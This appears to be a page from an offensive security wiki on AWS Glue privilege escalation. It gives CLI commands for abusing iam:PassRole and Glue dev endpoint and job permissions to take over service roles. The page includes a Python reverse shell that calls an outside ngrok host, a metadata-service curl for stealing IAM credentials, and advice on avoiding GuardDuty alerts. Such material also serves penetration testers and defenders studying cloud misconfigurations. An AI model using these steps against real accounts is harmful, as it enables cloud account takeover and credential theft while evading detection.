## glue

### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

An attacker with the `iam:PassRole` and `glue:CreateDevEndpoint` permissions could c**reate a new AWS Glue development endpoint and pass an existing service role to it**. They then could SSH into the instance and use the AWS CLI to have access of the permissions the role has access to.

```
aws glue create-dev-endpoint --endpoint-name my_dev_endpoint \
    --role-arn arn_of_glue_service_role \
    --public-key file:///path/to/my/public/ssh/key.pub
```

Now the attacker would just need to **SSH into the development endpoint** to access the roles credentials.

```bash
# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```

Even though it is not specifically noted in the GuardDuty documentation, it would be a bad idea to exfiltrate the credentials from the Glue Instance. Instead, **the AWS API should be accessed directly from the new instance**.

**Potential Impact:** Privesc to the glue service role specified.

### `glue:UpdateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

An attacker with the **`glue:UpdateDevEndpoint`** permission would be able to **update the associated SSH public key of an existing Glue development endpoint**, to then SSH into it and have access to the permissions the attached role has access to.

```bash
# Change public key to connect
aws glue --endpoint-name target_endpoint \
    --public-key file:///path/to/my/public/ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```

Now the attacker would just need to **SSH into the development endpoint to access the roles credentials**. The AWS API should be accessed directly from the new instance to avoid triggering alerts.

**Potential Impact:** Privesc to the glue service role used.

### `iam:PassRole`, (`glue:CreateJob` | `glue:UpdateJob`), (`glue:StartJobRun` | `glue:CreateTrigger`)

An attacker with those permissions can **create/update a job attaching any glue service account** and start it. The job can execute arbitrary python code, so a reverse shell can be obtained and used to **steal the IAM credentials** of the attached role.

```bash
# Content of the python script saved in s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#To get the IAM Role creds run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# A Glue role with admin access was created
aws glue create-job \
    --name privesctest \
    --role arn:aws:iam::93424712358:role/GlueAdmin \
    --command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# You can directly start the job
aws glue start-job-run --job-name privesctest
# Or you can create a trigger to start it
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
    --actions '[{"JobName": "privesctest"}]' --start-on-creation \
    --schedule "0/5 * * * * *"  #Every 5mins, feel free to change
```

**Potential Impact:** Privesc to the glue service role specified.

### `glue:UpdateJob`

Just with the update permission an attacked could steal the IAM Credentials of the already attached role.

**Potential Impact:** Privesc to the glue service role attached.
